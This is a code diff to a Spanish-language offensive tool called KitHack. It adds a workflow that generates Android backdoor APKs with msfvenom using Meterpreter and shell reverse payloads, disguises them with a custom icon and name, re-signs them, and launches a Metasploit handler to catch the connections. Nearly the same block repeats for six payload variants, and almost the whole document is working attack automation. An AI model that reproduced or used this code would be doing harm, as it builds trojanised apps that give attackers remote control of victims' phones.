@@ -10,6 +10,7 @@ BLUE, RED, WHITE, CYAN, DEFAULT, YELLOW, MAGENTA, GREEN, END, BOLD = '\33[94m', 
 import sys
 import urllib 
 import os 
+import subprocess
 import time
 import Tkinter, Tkconstants, tkFileDialog
 from sys import exit 
@@ -799,7 +800,7 @@ def options():
 	elif option == 10:
 		os.system('clear')
 		print("\033[01;31m")
-		archivo = open("icons/msf.txt")
+		archivo = open("images/msf.txt")
 		print(archivo.read())
 
 		#Sys msfvenom 
@@ -1751,7 +1752,65 @@ def options():
 					os.system(command)
 					LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+					while raw_input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
+						break
+					else:
+						Tk().withdraw()
+						icon = tkFileDialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
+						print("\n{0}ICON: {1}".format(YELLOW, icon))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))					
+						mainout = os.path.splitext(OUT)[0]	
+						file = open("/tmp/data.txt", "w")
+						file.write(icon + '\n')
+						file.write(mainout)
+						file.close()
+						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)
+						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_http LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
+						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)						
+						os.system('apktool d -f -o output/payload output/payload.apk')
+						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)
+						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
+						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)
+						os.system('apktool b output/payload -o output/kithack.apk')
+						location = os.getcwd()
+						if os.path.isfile('output/kithack.apk'):
+							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
+							time.sleep(4)
+							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
+							time.sleep(4)
+							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
+							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
+							time.sleep(4)
+							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_http; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_http; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+						else:
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()
+
+					# Salida de bucle
+					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))					
 					mainout = os.path.splitext(OUT)[0]
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
@@ -1798,7 +1857,7 @@ def options():
 						mainout = os.path.splitext(OUT)[0]
 						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))	
 						time.sleep(4)
-						os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter_reverse_http LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
+						os.system('systemctl start postgresql && msfvenom -x {0} -p android/meterpreter_reverse_https LHOST={1} LPORT={2} > output/{3}.apk'.format(APK, LHOST, LPORT, mainout))																				
 						location = os.getcwd()
 						if os.stat('output/{}.apk'.format(mainout)).st_size != 0:	
 							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
@@ -1906,7 +1965,65 @@ def options():
 					os.system(command)
 					LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+					while raw_input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
+						break
+					else:
+						Tk().withdraw()
+						icon = tkFileDialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
+						print("\n{0}ICON: {1}".format(YELLOW, icon))
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
+						mainout = os.path.splitext(OUT)[0]	
+						file = open("/tmp/data.txt", "w")
+						file.write(icon + '\n')
+						file.write(mainout)
+						file.close()
+						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)
+						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_https LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
+						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)						
+						os.system('apktool d -f -o output/payload output/payload.apk')
+						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)
+						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
+						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)
+						os.system('apktool b output/payload -o output/kithack.apk')
+						location = os.getcwd()
+						if os.path.isfile('output/kithack.apk'):
+							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
+							time.sleep(4)
+							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
+							time.sleep(4)
+							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
+							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
+							time.sleep(4)
+							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_https; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_https; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+						else:
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()
+
+					# Salida de bucle
+					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))											
 					mainout = os.path.splitext(OUT)[0]
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
@@ -2060,7 +2177,65 @@ def options():
 					os.system(command)
 					LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+					while raw_input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
+						break
+					else:
+						Tk().withdraw()
+						icon = tkFileDialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
+						print("\n{0}ICON: {1}".format(YELLOW, icon))						
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
+						mainout = os.path.splitext(OUT)[0]	
+						file = open("/tmp/data.txt", "w")
+						file.write(icon + '\n')
+						file.write(mainout)
+						file.close()
+						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)
+						os.system('systemctl start postgresql && msfvenom -p android/meterpreter_reverse_tcp LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
+						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)						
+						os.system('apktool d -f -o output/payload output/payload.apk')
+						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)
+						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
+						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)
+						os.system('apktool b output/payload -o output/kithack.apk')
+						location = os.getcwd()
+						if os.path.isfile('output/kithack.apk'):
+							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
+							time.sleep(4)
+							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
+							time.sleep(4)
+							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
+							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
+							time.sleep(4)
+							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter_reverse_tcp; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+						else:
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()
+
+					# Salida de bucle
+					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))											
 					mainout = os.path.splitext(OUT)[0]
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
@@ -2214,7 +2389,65 @@ def options():
 					os.system(command)
 					LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+					while raw_input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
+						break
+					else:
+						Tk().withdraw()
+						icon = tkFileDialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
+						print("\n{0}ICON: {1}".format(YELLOW, icon))						
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))												
+						mainout = os.path.splitext(OUT)[0]	
+						file = open("/tmp/data.txt", "w")
+						file.write(icon + '\n')
+						file.write(mainout)
+						file.close()
+						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)
+						os.system('systemctl start postgresql && msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
+						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)						
+						os.system('apktool d -f -o output/payload output/payload.apk')
+						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)
+						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
+						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)
+						os.system('apktool b output/payload -o output/kithack.apk')
+						location = os.getcwd()
+						if os.path.isfile('output/kithack.apk'):
+							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
+							time.sleep(4)
+							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
+							time.sleep(4)
+							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
+							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
+							time.sleep(4)
+							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/meterpreter/reverse_tcp; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+						else:
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()
+
+					# Salida de bucle
+					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))											
 					mainout = os.path.splitext(OUT)[0]
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
@@ -2368,7 +2601,65 @@ def options():
 					os.system(command)
 					LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+					while raw_input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
+						break
+					else:
+						Tk().withdraw()
+						icon = tkFileDialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
+						print("\n{0}ICON: {1}".format(YELLOW, icon))						
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))												
+						mainout = os.path.splitext(OUT)[0]	
+						file = open("/tmp/data.txt", "w")
+						file.write(icon + '\n')
+						file.write(mainout)
+						file.close()
+						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)
+						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_http LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
+						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)						
+						os.system('apktool d -f -o output/payload output/payload.apk')
+						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)
+						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
+						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)
+						os.system('apktool b output/payload -o output/kithack.apk')
+						location = os.getcwd()
+						if os.path.isfile('output/kithack.apk'):
+							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
+							time.sleep(4)
+							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
+							time.sleep(4)
+							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
+							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
+							time.sleep(4)
+							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_http; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_http; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+						else:
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()
+
+					# Salida de bucle
+					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
 					mainout = os.path.splitext(OUT)[0]
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
@@ -2522,7 +2813,65 @@ def options():
 					os.system(command)
 					LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+					while raw_input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
+						break
+					else:
+						Tk().withdraw()
+						icon = tkFileDialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
+						print("\n{0}ICON: {1}".format(YELLOW, icon))						
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
+						mainout = os.path.splitext(OUT)[0]	
+						file = open("/tmp/data.txt", "w")
+						file.write(icon + '\n')
+						file.write(mainout)
+						file.close()
+						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)
+						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_https LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
+						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)						
+						os.system('apktool d -f -o output/payload output/payload.apk')
+						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)
+						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
+						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)
+						os.system('apktool b output/payload -o output/kithack.apk')
+						location = os.getcwd()
+						if os.path.isfile('output/kithack.apk'):
+							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
+							time.sleep(4)
+							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
+							time.sleep(4)
+							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
+							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
+							time.sleep(4)
+							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_https; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_https; exploit\'"')
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+						else:
+							print("\n{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
+							time.sleep(3)
+							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')							
+							pause("{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()
+
+					# Salida de bucle					
+					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
 					mainout = os.path.splitext(OUT)[0]
 					print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 					time.sleep(4)
@@ -2676,7 +3025,65 @@ def options():
 					os.system(command)
 					LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 					LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
-					OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+					while raw_input("\n{0}[!] ¿Desea modificar el nombre/icono predeterminados? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":  
+						break
+					else:
+						Tk().withdraw()
+						icon = tkFileDialog.askopenfilename(title = "KITHACK - SELECT ICON PNG",filetypes = (("png files","*.png"),("all files","*.*")))
+						print("\n{0}ICON: {1}".format(YELLOW, icon))						
+						OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))						
+						mainout = os.path.splitext(OUT)[0]	
+						file = open("/tmp/data.txt", "w")
+						file.write(icon + '\n')
+						file.write(mainout)
+						file.close()
+						print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)
+						os.system('systemctl start postgresql && msfvenom -p android/shell/reverse_tcp LHOST={0} LPORT={1} R > output/payload.apk'.format(LHOST, LPORT))																				
+						print("{0}[*] Decompiling APK...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)						
+						os.system('apktool d -f -o output/payload output/payload.apk')
+						print("\n{0}[*] Configuring icon change...{1}".format(GREEN, DEFAULT))
+						time.sleep(4)
+						subprocess.Popen(['bash', '-c', '. lib/apkf.sh; icon']) 
+						print("\n{0}[*] Compiling RAT APK...{1}".format(GREEN, DEFAULT))		
+						time.sleep(4)
+						os.system('apktool b output/payload -o output/kithack.apk')
+						location = os.getcwd()
+						if os.path.isfile('output/kithack.apk'):
+							print("\n{0}[*] Signing APK...{1}".format(GREEN, DEFAULT))	
+							time.sleep(4)
+							os.system('jarsigner -keystore certificate.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA output/kithack.apk android')	
+							time.sleep(4)
+							os.system('zipalign 4 output/kithack.apk output/{0}.apk'.format(mainout))
+							print("\n{0}[*] Deleting temporary files...{1}".format(GREEN, DEFAULT))
+							time.sleep(4)
+							os.system('rm -rf output/payload output/payload.apk output/kithack.apk')
+							print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.apk".format(GREEN, DEFAULT, location, mainout))	
+							if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+								os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+								banner(), menu(), options()	
+							else:
+								while LHOST != "0.tcp.ngrok.io":
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD android/shell/reverse_tcp; exploit\'"'.format(LHOST, LPORT))
+									pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+									os.system('systemctl stop postgresql && kill -9 $(pgrep ngrok) && clear')
+									banner(), menu(), options()	
+								else:
+									os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD android/shell/reverse_tcp; exploit\'"')
